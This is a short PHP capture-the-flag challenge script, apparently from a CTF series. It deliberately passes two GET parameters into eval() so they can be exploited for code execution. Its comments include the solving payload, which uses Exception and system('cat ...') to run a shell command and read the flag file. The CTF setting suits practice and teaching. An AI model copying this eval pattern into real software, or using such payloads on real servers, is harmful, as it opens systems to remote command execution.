<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-29 22:02:34

*/


highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    echo $v2;
    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
        echo "echo new $v1($v2());";
        eval("echo new $v1($v2());");
    }
    // v1只能是a-zA-Z
    // v2只能是a-zA-Z
    // payload: ?v1=Exception&v2=system('cat fl36dg.txt')
    // eval("echo new Exception(system('cat fl36dg.txt')());")
}
